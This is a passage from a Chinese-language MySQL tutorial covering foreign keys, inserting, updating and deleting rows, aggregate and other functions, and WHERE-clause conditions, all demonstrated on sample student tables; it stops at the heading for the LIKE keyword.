<h4 id="外键约束的创建">外键约束的创建</h4>
<p>外键约束即FOREIGN KEY常用于多张表之间的约束。基本语法如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 在创建数据表时语法如下：</span></span><br><span class="line"><span class="keyword">CONSTRAINT</span> 外键名 <span class="keyword">FOREIGN</span> KEY (从表外键字段) <span class="keyword">REFERENCES</span> 主表 (主键字段)</span><br><span class="line"><span class="comment">-- 将创建数据表创号后语法如下：</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 从表名 <span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> 外键名 <span class="keyword">FOREIGN</span> KEY (从表外键字段) <span class="keyword">REFERENCES</span> 主表 (主键字段);</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><figcaption><span>外键约束示例</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>创建一个学生表</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student05(</span><br><span class="line">id <span class="type">int</span> <span class="keyword">primary</span> key,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">20</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>创建一个班级表</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> class(</span><br><span class="line">classid <span class="type">int</span> <span class="keyword">primary</span> key,</span><br><span class="line">studentid <span class="type">int</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>学生表作为主表，班级表作为副表设置外键</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> class <span class="keyword">add</span> <span class="keyword">constraint</span> fk_class_studentid <span class="keyword">foreign</span> key(studentid) <span class="keyword">references</span> student05(id);</span><br></pre></td></tr></table></figure>
<p>可通过<code>show create table class;</code>命令查看详细信息。</p>
<h4 id="外键约束的详细操作">外键约束的详细操作</h4>
<ol>
<li class="lvl-3">
<p>数据一致性概念</p>
</li>
</ol>
<p>大家知道：建立外键是为了保证数据的完整和统一性。但是，如果主表中的数据被删除或修改从表中对应的数据该怎么办呢？很明显，从表中对应的数据也应该被删除，否则数据库中会存在很多无意义的垃圾数据。</p>
<ol start="2">
<li class="lvl-3">
<p>删除外键</p>
</li>
</ol>
<p>语法如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 从表名 <span class="keyword">drop</span> <span class="keyword">foreign</span> key 外键名；</span><br></pre></td></tr></table></figure>
<p>示例中删除外键的命令：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> class <span class="keyword">drop</span> <span class="keyword">foreign</span> key fk_class_studentid;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p>关于外键约束需要注意的细节</p>
<ol>
<li class="lvl-6">从表里的外键通常为主表的主键</li>
<li class="lvl-6">从表里外键的数据类型必须与主表中主键的数据类型一致</li>
<li class="lvl-6">主表发生变化时应注意主表与从表的数据一致性问题</li>
</ol>
</li>
</ol>
<h2 id="数据表插入数据">数据表插入数据</h2>
<p>在MySQL通过INSERT语句向数据表中插入数据。在此，我们先准备一张学生表，代码如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student(</span><br><span class="line">id <span class="type">int</span>,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">30</span>),</span><br><span class="line">age <span class="type">int</span>,</span><br><span class="line">gender <span class="type">varchar</span>(<span class="number">30</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>向数据表中插入数据时，每个字段与其值是严格一一对应的。也就是说：每个值、值的顺序、值的类型必须与对应的字段相匹配。但是，各字段无须与其在表中定义的顺序一致，它们只要与 VALUES中值的顺序一致即可。同时，插入数据的方法和为表中所有字段插入数据一样，只是需要插入的字段由你自己指定。语法如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名（字段名<span class="number">1</span>,字段名<span class="number">2</span>,...) <span class="keyword">VALUES</span> (值 <span class="number">1</span>,值 <span class="number">2</span>,...);</span><br></pre></td></tr></table></figure>
<p>向表中插入多条数据的语法如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名 [(字段名<span class="number">1</span>,字段名<span class="number">2</span>,...)]<span class="keyword">VALUES</span> (值 <span class="number">1</span>,值 <span class="number">2</span>,…),(值 <span class="number">1</span>,值 <span class="number">2</span>,…),...;</span><br></pre></td></tr></table></figure>
<p>在该方式中：(字段名1,字段名2,…)是可选的，它用于指定插入的字段名；(值 1,值 2,…),(值 1,值 2,…)表示要插入的记录，该记录可有多条并且每条记录之间用逗号隔开。示例如下：</p>
<figure class="highlight sql"><figcaption><span>向表中插入多条数据示例</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> student (id,name,age,gender) <span class="keyword">values</span> (<span class="number">2</span>,<span class="string">&#x27;lucy&#x27;</span>,<span class="number">17</span>,<span class="string">&#x27;female&#x27;</span>),(<span class="number">3</span>,<span class="string">&#x27;jack&#x27;</span>,<span class="number">19</span>,<span class="string">&#x27;male&#x27;</span>),(<span class="number">4</span>,<span class="string">&#x27;tom&#x27;</span>,<span class="number">18</span>,<span class="string">&#x27;male&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h2 id="更新数据">更新数据</h2>
<p>在MySQL通过UPDATE语句更新数据表中的数据。在此，我们将就用六中的student学生表</p>
<ol>
<li class="lvl-3">
<p>UPDATE的基本语法为：</p>
</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> 表名 <span class="keyword">SET</span> 字段名<span class="number">1</span><span class="operator">=</span>值<span class="number">1</span>[,字段名<span class="number">2</span> <span class="operator">=</span>值<span class="number">2</span>,…] [<span class="keyword">WHERE</span> 条件表达式];</span><br></pre></td></tr></table></figure>
<p>在该语法中：字段名1、字段名2…用于指定要更新的字段名称；值1、值 2…用于表示字段的新数据；WHERE 条件表达式 是可选的，它用于指定更新数据需要满足的条件</p>
<ol start="2">
<li class="lvl-3">
<p>UPDATE更新部分数据</p>
</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">将name为tom的记录的age设置为<span class="number">20</span>并将其gender设置为female</span><br><span class="line"><span class="keyword">update</span> student <span class="keyword">set</span> age<span class="operator">=</span><span class="number">20</span>,gender<span class="operator">=</span><span class="string">&#x27;female&#x27;</span> <span class="keyword">where</span> name<span class="operator">=</span><span class="string">&#x27;tom&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p>UPDATE更新全部数据</p>
</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> student <span class="keyword">set</span> age<span class="operator">=</span><span class="number">18</span>;</span><br></pre></td></tr></table></figure>
<h2 id="删除数据">删除数据</h2>
<p>在MySQL通过DELETE语句删除数据表中的数据。在此，我们先准备一张数据表，代码如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建学生表</span></span><br><span class="line"> <span class="keyword">create</span> <span class="keyword">table</span> student(</span><br><span class="line"> id <span class="type">int</span>,</span><br><span class="line"> name <span class="type">varchar</span>(<span class="number">30</span>),</span><br><span class="line"> age <span class="type">int</span>,</span><br><span class="line"> gender <span class="type">varchar</span>(<span class="number">30</span>)</span><br><span class="line"> );</span><br><span class="line"> <span class="comment">-- 插入数据</span></span><br><span class="line"> <span class="keyword">insert</span> <span class="keyword">into</span> student (id,name,age,gender) <span class="keyword">values</span> (<span class="number">2</span>,<span class="string">&#x27;lucy&#x27;</span>,<span class="number">17</span>,<span class="string">&#x27;female&#x27;</span>),(<span class="number">3</span>,<span class="string">&#x27;jack&#x27;</span>,<span class="number">19</span>,<span class="string">&#x27;male&#x27;</span>),(<span class="number">4</span>,<span class="string">&#x27;tom&#x27;</span>,<span class="number">18</span>,<span class="string">&#x27;male&#x27;</span>),(<span class="number">5</span>,<span class="string">&#x27;sal&#x27;</span>,<span class="number">19</span>,<span class="string">&#x27;female&#x27;</span>),(<span class="number">6</span>,<span class="string">&#x27;sun&#x27;</span>,<span class="number">20</span>,<span class="string">&#x27;male&#x27;</span>)</span><br><span class="line">,(<span class="number">7</span>,<span class="string">&#x27;sad&#x27;</span>,<span class="number">13</span>,<span class="string">&#x27;female&#x27;</span>),(<span class="number">8</span>,<span class="string">&#x27;sam&#x27;</span>,<span class="number">14</span>,<span class="string">&#x27;male&#x27;</span>);</span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>DELETE基本语法</p>
</li>
</ol>
<p>在该语法中：表名用于指定要执行删除操作的表；[WHERE 条件表达式]为可选参数用于指定删除的条件。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> 表名 [<span class="keyword">WHERE</span> 条件表达式];</span><br></pre></td></tr></table></figure>
<ol start="2">
<li class="lvl-3">
<p>DELETE删除部分数据</p>
</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">删除age等于<span class="number">14</span>的所有记录</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> student <span class="keyword">where</span> age<span class="operator">=</span><span class="number">14</span>;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p>DELETE删除全部数据</p>
</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">删除student表中的所有记录</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li class="lvl-3">
<p>TRUNCATE与DELETE的区别</p>
</li>
</ol>
<p>TRUNCATE和DELETE都能实现删除表中的所有数据的功能，但两者也是有区别的：<br>
1、DELETE语句后可跟WHERE子句，可通过指定WHERE子句中的条件表达式只删除满足条件的部分记录；但是，TRUNCATE语句只能用于删除表中的所有记录。<br>
2、使用TRUNCATE语句删除表中的数据后，再次向表中添加记录时自动增加字段的默认初始值重新由1开始；使用DELETE语句删除表中所有记录后，再次向表中添加记录时自动增加字段的值为删除时该字段的最大值加1<br>
3、DELETE语句是DML语句，TRUNCATE语句通常被认为是DDL语句</p>
<h2 id="简单查询">简单查询</h2>
<p>简单查询即不含where的select语句。在此，我们讲解简单查询中最常用的两种查询：查询所有字段和查询指定字段。在此，先准备测试数据，代码如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建数据库</span></span><br><span class="line"><span class="keyword">DROP</span> DATABASE IF <span class="keyword">EXISTS</span> mydb;</span><br><span class="line"><span class="keyword">CREATE</span> DATABASE mydb;</span><br><span class="line">USE mydb;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建student表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> student (</span><br><span class="line">    sid <span class="type">CHAR</span>(<span class="number">6</span>),</span><br><span class="line">    sname <span class="type">VARCHAR</span>(<span class="number">50</span>),</span><br><span class="line">    age <span class="type">INT</span>,</span><br><span class="line">    gender <span class="type">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;male&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 向student表插入数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1001&#x27;</span>, <span class="string">&#x27;lili&#x27;</span>, <span class="number">14</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1002&#x27;</span>, <span class="string">&#x27;wang&#x27;</span>, <span class="number">15</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1003&#x27;</span>, <span class="string">&#x27;tywd&#x27;</span>, <span class="number">16</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1004&#x27;</span>, <span class="string">&#x27;hfgs&#x27;</span>, <span class="number">17</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1005&#x27;</span>, <span class="string">&#x27;qwer&#x27;</span>, <span class="number">18</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1006&#x27;</span>, <span class="string">&#x27;zxsd&#x27;</span>, <span class="number">19</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1007&#x27;</span>, <span class="string">&#x27;hjop&#x27;</span>, <span class="number">16</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1008&#x27;</span>, <span class="string">&#x27;tyop&#x27;</span>, <span class="number">15</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1009&#x27;</span>, <span class="string">&#x27;nhmk&#x27;</span>, <span class="number">13</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1010&#x27;</span>, <span class="string">&#x27;xdfv&#x27;</span>, <span class="number">17</span>, <span class="string">&#x27;female&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>数据表简单查询示例</p>
<figure class="highlight sql"><figcaption><span>数据表简单查询示例</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>查询所有字段（方法不唯一）</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>查询指定字段（sid、sname）</span><br><span class="line"><span class="keyword">select</span> sid,sname <span class="keyword">from</span> student;</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>常数的查询（日期标记）</span><br><span class="line"><span class="keyword">select</span> sid,sname,<span class="string">&#x27;2021-03-02&#x27;</span> <span class="keyword">from</span> student;</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>从查询结果中过滤重复数据</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> gender <span class="keyword">from</span> student;</span><br><span class="line">注： 在<span class="keyword">SELECT</span>查询语句中<span class="keyword">DISTINCT</span>关键字只能用在第一个所查列名之前</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span>算术运算符</span><br><span class="line"> <span class="keyword">select</span> sname,age<span class="operator">+</span><span class="number">10</span> <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure>
<h2 id="函数">函数</h2>
<h3 id="聚合函数">聚合函数</h3>
<p>在开发中，我们常常有类似的需求：统计某个字段的最大值、最小值、 平均值等等。为此，MySQL中提供了聚合函数来实现这些功能。所谓聚合，就是将多行汇总成一行；其实，所有的聚合函数均如此——输入多行，输出一行。聚合函数具有自动滤空的功能，若某一个值为NULL，那么会自动将其过滤使其不参与运算。</p>
<p><strong>聚合函数使用规则：</strong><br>
只有SELECT子句和HAVING子句、ORDER BY子句中能够使用聚合函数。例如，在WHERE子句中使用聚合函数是错误的。接下来，我们学习常用聚合函数。</p>
<ol>
<li class="lvl-3">
<p>count()</p>
</li>
</ol>
<p>统计表中数据的行数或者统计指定列其值不为NULL的数据个数</p>
<p><em>查询有多少该表中有多少人</em></p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li class="lvl-3">
<p>max()</p>
</li>
</ol>
<p>计算指定列的最大值，如果指定列是字符串类型则使用字符串排序运算</p>
<p><em>查询该学生表中年纪最大的学生</em></p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">max</span>(<span class="params">age</span>) <span class="keyword">from</span> student</span>;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p>min()</p>
</li>
</ol>
<p>计算指定列的最小值，如果指定列是字符串类型则使用字符串排序运算</p>
<p>查询该学生表中年纪最小的学生 MySQL命令：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> sname,<span class="built_in">min</span>(age) <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li class="lvl-3">
<p>sum()</p>
</li>
</ol>
<p>计算指定列的数值和，如果指定列类型不是数值类型则计算结果为0</p>
<p>查询该学生表中年纪的总和 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">sum</span>(age) <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure>
<ol start="5">
<li class="lvl-3">
<p>avg()</p>
</li>
</ol>
<p>计算指定列的平均值，如果指定列类型不是数值类型则计算结果为</p>
<p>查询该学生表中年纪的平均数 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">avg</span>(age) <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure>
<h3 id="其他函数">其他函数</h3>
<ol>
<li class="lvl-3">
<p>时间函数</p>
</li>
</ol>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> NOW();</span><br><span class="line"><span class="keyword">SELECT</span> DAY (NOW());</span><br><span class="line"><span class="keyword">SELECT</span> <span class="type">DATE</span> (NOW());</span><br><span class="line"><span class="keyword">SELECT</span> <span class="type">TIME</span> (NOW());</span><br><span class="line"><span class="keyword">SELECT</span> YEAR (NOW());</span><br><span class="line"><span class="keyword">SELECT</span> MONTH (NOW());</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">CURRENT_DATE</span>();</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">CURRENT_TIME</span>();</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">CURRENT_TIMESTAMP</span>();</span><br><span class="line"><span class="keyword">SELECT</span> ADDTIME(<span class="string">&#x27;14:23:12&#x27;</span>,<span class="string">&#x27;01:02:01&#x27;</span>);</span><br><span class="line"><span class="keyword">SELECT</span> DATE_ADD(NOW(),<span class="type">INTERVAL</span> <span class="number">1</span> DAY);</span><br><span class="line"><span class="keyword">SELECT</span> DATE_ADD(NOW(),<span class="type">INTERVAL</span> <span class="number">1</span> MONTH);</span><br><span class="line"><span class="keyword">SELECT</span> DATE_SUB(NOW(),<span class="type">INTERVAL</span> <span class="number">1</span> DAY);</span><br><span class="line"><span class="keyword">SELECT</span> DATE_SUB(NOW(),<span class="type">INTERVAL</span> <span class="number">1</span> MONTH);</span><br><span class="line"><span class="keyword">SELECT</span> DATEDIFF(<span class="string">&#x27;2019-07-22&#x27;</span>,<span class="string">&#x27;2019-05-05&#x27;</span>);</span><br></pre></td></tr></table></figure>
<ol start="2">
<li class="lvl-3">
<p>字符串函数</p>
</li>
</ol>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">--连接函数</span><br><span class="line"><span class="section">SELECT CONCAT ()</span></span><br><span class="line"><span class="section">--</span></span><br><span class="line">SELECT INSTR ();</span><br><span class="line">--统计长度</span><br><span class="line">SELECT LENGTH();</span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p>数学函数</p>
</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 绝对值</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">ABS</span>(<span class="number">-136</span>);</span><br><span class="line"><span class="comment">-- 向下取整</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">FLOOR</span>(<span class="number">3.14</span>);</span><br><span class="line"><span class="comment">-- 向上取整</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">CEILING</span>(<span class="number">3.14</span>);</span><br></pre></td></tr></table></figure>
<h2 id="条件查询">条件查询</h2>
<p>数据库中存有大量数据，我们可根据需求获取指定的数据。此时，我们可在查询语句中通过WHERE子句指定查询条件对查询结果进行过滤。在开始学习条件查询之前，我们先准备测试数据，代码如下：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建数据库</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">DATABASE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> mydb;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> mydb;</span><br><span class="line">USE mydb;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建student表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> student (</span><br><span class="line">    sid <span class="type">CHAR</span>(<span class="number">6</span>),</span><br><span class="line">    sname <span class="type">VARCHAR</span>(<span class="number">50</span>),</span><br><span class="line">    age <span class="type">INT</span>,</span><br><span class="line">    gender <span class="type">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;male&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 向student表插入数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1001&#x27;</span>, <span class="string">&#x27;lili&#x27;</span>, <span class="number">14</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1002&#x27;</span>, <span class="string">&#x27;wang&#x27;</span>, <span class="number">15</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1003&#x27;</span>, <span class="string">&#x27;tywd&#x27;</span>, <span class="number">16</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1004&#x27;</span>, <span class="string">&#x27;hfgs&#x27;</span>, <span class="number">17</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1005&#x27;</span>, <span class="string">&#x27;qwer&#x27;</span>, <span class="number">18</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1006&#x27;</span>, <span class="string">&#x27;zxsd&#x27;</span>, <span class="number">19</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1007&#x27;</span>, <span class="string">&#x27;hjop&#x27;</span>, <span class="number">16</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1008&#x27;</span>, <span class="string">&#x27;tyop&#x27;</span>, <span class="number">15</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1009&#x27;</span>, <span class="string">&#x27;nhmk&#x27;</span>, <span class="number">13</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1010&#x27;</span>, <span class="string">&#x27;xdfv&#x27;</span>, <span class="number">17</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1012&#x27;</span>, <span class="string">&#x27;lili&#x27;</span>, <span class="number">14</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1013&#x27;</span>, <span class="string">&#x27;wang&#x27;</span>, <span class="number">15</span>, <span class="string">&#x27;female&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h3 id="关系运算符">关系运算符</h3>
<p>在WHERE中可使用关系运算符进行条件查询，常用的关系运算符如下所示：</p>
<table>
<thead>
<tr>
<th style="text-align:center">关系运算符</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">=</td>
<td style="text-align:center">等于</td>
</tr>
<tr>
<td style="text-align:center">&lt;&gt;</td>
<td style="text-align:center">不等于</td>
</tr>
<tr>
<td style="text-align:center">!=</td>
<td style="text-align:center">不等于</td>
</tr>
<tr>
<td style="text-align:center">&lt;</td>
<td style="text-align:center">小于</td>
</tr>
<tr>
<td style="text-align:center">&lt;=</td>
<td style="text-align:center">小于等于</td>
</tr>
<tr>
<td style="text-align:center">&gt;</td>
<td style="text-align:center">大于</td>
</tr>
<tr>
<td style="text-align:center">&gt;=</td>
<td style="text-align:center">大于等于</td>
</tr>
</tbody>
</table>
<h3 id="常用的关键字">常用的关键字</h3>
<ol>
<li class="lvl-3">
<p>AND关键字</p>
</li>
</ol>
<p>查询年纪大于15且性别为male的学生信息 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> age&gt;<span class="number">15</span> and gender=<span class="string">&#x27;male&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li class="lvl-3">
<p>OR关键字</p>
</li>
</ol>
<p>查询年纪大于15或者性别为male的学生信息</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> age&gt;<span class="number">15</span> or gender=<span class="string">&#x27;male&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p>IN关键字</p>
</li>
</ol>
<p>IN关键字用于判断某个字段的值是否在指定集合中。如果字段的值恰好在指定的集合中，则将字段所在的记录将査询出来。</p>
<p>查询sid为S_1002和S_1003的学生信息</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="function"><span class="keyword">from</span> student <span class="keyword">where</span> sid <span class="title">in</span> (<span class="params"><span class="string">&#x27;S_1002&#x27;</span>,<span class="string">&#x27;S_1003&#x27;</span></span>)</span>;</span><br></pre></td></tr></table></figure>
<p>查询sid为S_1001以外的学生的信息</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="function"><span class="keyword">from</span> student <span class="keyword">where</span> sid <span class="keyword">not</span> <span class="title">in</span> (<span class="params"><span class="string">&#x27;S_1001&#x27;</span></span>)</span>;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li class="lvl-3">
<p>BETWEEN AND关键字</p>
</li>
</ol>
<p>BETWEEN AND用于判断某个字段的值是否在指定的范围之内。如果字段的值在指定范围内，则将所在的记录将查询出来（好像不太一定等于右边的还是左边的）</p>
<p>查询15到18岁的学生信息</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> age <span class="keyword">between</span> <span class="number">15</span> <span class="keyword">and</span> <span class="number">18</span>;</span><br></pre></td></tr></table></figure>
<ol start="5">
<li class="lvl-3">
<p>NULL关键字</p>
</li>
</ol>
<p>在MySQL中，使用 IS NULL关键字判断字段的值是否为空值。请注意：空值NULL不同于0，也不同于空字符串</p>
<p>查询sname不为空值的学生信息</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> sname <span class="keyword">is</span> not <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>
<h3 id="LIKE关键字">LIKE关键字</h3>
